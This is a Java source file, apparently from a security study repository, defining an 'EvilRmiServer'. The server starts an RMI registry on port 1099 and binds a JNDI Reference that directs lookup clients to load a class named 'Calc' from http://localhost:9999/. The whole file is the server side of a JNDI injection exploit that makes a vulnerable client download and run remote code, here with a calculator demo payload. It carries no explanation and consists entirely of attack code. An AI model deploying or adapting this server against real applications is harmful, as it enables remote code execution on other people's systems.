package JNDI.rmiMethod;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRmiServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Calc", "Calc", "http://localhost:9999/");
        ReferenceWrapper calc = new ReferenceWrapper(reference);
        registry.bind("calc", calc);
    }
}
